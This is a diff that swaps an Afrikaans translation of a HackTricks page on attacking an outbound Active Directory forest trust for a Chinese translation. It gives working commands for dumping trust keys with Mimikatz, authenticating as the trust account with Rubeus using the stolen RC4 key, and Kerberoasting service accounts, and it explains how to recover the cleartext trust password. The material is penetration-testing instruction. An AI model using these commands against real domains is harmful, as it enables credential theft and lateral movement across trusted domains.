@@ -1,25 +1,25 @@
-# Eksterne Woud-domein - Eenrigting (Uitgaand)
+# 外部森林域 - 单向（出站）
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Rooi Span Ekspert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Rooi Span Ekspert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
-In hierdie scenario **jou domein** is **vertrou** op **sekere voorregte** aan 'n hoof van **verskillende domeine**.
+在此场景中 **您的域** 正在 **信任** 来自 **不同域** 的某些 **权限**。
 
-## Opname
+## 枚举
 
-### Uitgaande Vertroue
+### 出站信任
 ```powershell
 # Notice Outbound trust
 Get-DomainTrust
@@ -43,57 +43,57 @@ MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=F
 ```
 ## Trust Account Attack
 
-'n Sekuriteitskwesbaarheid bestaan wanneer 'n vertrouensverhouding tussen twee domeine gevestig word, hier geïdentifiseer as domein **A** en domein **B**, waar domein **B** sy vertroue na domein **A** uitbrei. In hierdie opstelling word 'n spesiale rekening in domein **A** geskep vir domein **B**, wat 'n belangrike rol speel in die verifikasieproses tussen die twee domeine. Hierdie rekening, geassosieer met domein **B**, word gebruik om kaartjies te enkripteer vir toegang tot dienste oor die domeine.
+当在两个域之间建立信任关系时，存在安全漏洞，这里将其称为域 **A** 和域 **B**，其中域 **B** 将其信任扩展到域 **A**。在这种设置中，在域 **A** 中为域 **B** 创建了一个特殊账户，该账户在两个域之间的身份验证过程中发挥着关键作用。与域 **B** 关联的此账户用于加密访问跨域服务的票证。
 
-Die kritieke aspek om hier te verstaan, is dat die wagwoord en hash van hierdie spesiale rekening uit 'n Domeinbeheerder in domein **A** onttrek kan word met behulp van 'n opdraglyn hulpmiddel. Die opdrag om hierdie aksie uit te voer is:
+这里需要理解的关键点是，可以使用命令行工具从域 **A** 的域控制器中提取此特殊账户的密码和哈希。执行此操作的命令是：
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
 ```
-Hierdie ekstraksie is moontlik omdat die rekening, wat met 'n **$** na sy naam geïdentifiseer word, aktief is en behoort tot die "Domain Users" groep van domein **A**, wat die regte wat met hierdie groep geassosieer word, erf. Dit stel individue in staat om teen domein **A** te autentiseer met die kredensiale van hierdie rekening.
+此提取之所以可能，是因为该账户在其名称后带有 **$**，处于活动状态，并且属于域 **A** 的“域用户”组，从而继承了与该组相关的权限。这使得个人可以使用该账户的凭据对域 **A** 进行身份验证。
 
-**Waarskuwing:** Dit is haalbaar om hierdie situasie te benut om 'n voet aan die grond in domein **A** te verkry as 'n gebruiker, alhoewel met beperkte regte. Hierdie toegang is egter voldoende om enumerasie op domein **A** uit te voer.
+**警告：** 利用这种情况可以作为用户在域 **A** 中获得立足点，尽管权限有限。然而，这种访问足以对域 **A** 进行枚举。
 
-In 'n scenario waar `ext.local` die vertrouende domein is en `root.local` die vertroude domein is, sal 'n gebruikersrekening met die naam `EXT$` binne `root.local` geskep word. Deur spesifieke gereedskap is dit moontlik om die Kerberos vertrouingssleutels te dump, wat die kredensiale van `EXT$` in `root.local` onthul. Die opdrag om dit te bereik is:
+在 `ext.local` 是信任域而 `root.local` 是被信任域的场景中，将在 `root.local` 中创建一个名为 `EXT$` 的用户账户。通过特定工具，可以转储 Kerberos 信任密钥，从而揭示 `root.local` 中 `EXT$` 的凭据。实现此目的的命令是：
 ```bash
 lsadump::trust /patch
 ```
-Hierdie kan gebruik word om die onttrokken RC4-sleutel te gebruik om as `root.local\EXT$` binne `root.local` te autentiseer met 'n ander hulpmiddelopdrag:
+在此之后，可以使用提取的 RC4 密钥通过另一个工具命令以 `root.local\EXT$` 身份在 `root.local` 中进行身份验证：
 ```bash
 .\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
 ```
-Hierdie verifikasiefase maak die moontlikheid oop om dienste binne `root.local` te tel en selfs te benut, soos om 'n Kerberoast-aanval uit te voer om diensrekening geloofsbriewe te onttrek met:
+此身份验证步骤打开了枚举甚至利用 `root.local` 中服务的可能性，例如执行 Kerberoast 攻击以提取服务帐户凭据，使用：
 ```bash
 .\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
 ```
-### Versameling van duidelike teks vertrouingswagwoord
+### 收集明文信任密码
 
-In die vorige vloei is die vertrouingshash gebruik in plaas van die **duidelike teks wagwoord** (wat ook **deur mimikatz gedump** is).
+在之前的流程中，使用了信任哈希而不是**明文密码**（该密码也被**mimikatz**提取）。
 
-Die duidelike teks wagwoord kan verkry word deur die \[ CLEAR ] uitvoer van mimikatz van hexadesimaal te omskakel en null bytes ‘\x00’ te verwyder:
+明文密码可以通过将mimikatz的\[ CLEAR ]输出从十六进制转换并去除空字节‘\x00’来获得：
 
 ![](<../../.gitbook/assets/image (938).png>)
 
-Soms, wanneer 'n vertrouingsverhouding geskep word, moet 'n wagwoord deur die gebruiker vir die vertroue getik word. In hierdie demonstrasie is die sleutel die oorspronklike vertrouingswagwoord en dus menslik leesbaar. Soos die sleutel siklusse (30 dae), sal die duidelike teks nie menslik leesbaar wees nie, maar tegnies steeds bruikbaar.
+有时在创建信任关系时，用户必须输入信任的密码。在这个演示中，密钥是原始信任密码，因此是人类可读的。随着密钥的循环（30天），明文将不再是人类可读的，但在技术上仍然可用。
 
-Die duidelike teks wagwoord kan gebruik word om gereelde outentisering as die vertrouingsrekening uit te voer, 'n alternatief om 'n TGT aan te vra met die Kerberos geheime sleutel van die vertrouingsrekening. Hier, om root.local van ext.local te vra vir lede van Domain Admins:
+明文密码可以用作信任账户进行常规身份验证，作为使用信任账户的Kerberos密钥请求TGT的替代方案。在这里，从ext.local查询root.local的Domain Admins成员：
 
 ![](<../../.gitbook/assets/image (792).png>)
 
-## Verwysings
+## 参考文献
 
 * [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**Telegram群组**](https://t.me/peass)或**在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub库提交PR来分享黑客技巧。
 
 </details>
 {% endhint %}
